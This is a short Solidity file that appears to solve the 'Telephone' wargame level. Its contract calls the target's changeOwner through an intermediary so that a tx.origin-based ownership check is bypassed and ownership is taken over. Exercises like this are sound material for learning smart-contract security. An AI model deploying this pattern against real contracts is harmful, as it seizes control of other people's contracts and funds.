// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../../interfaces/ITelephone.sol";


contract TelephoneAttack {
    ITelephone target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}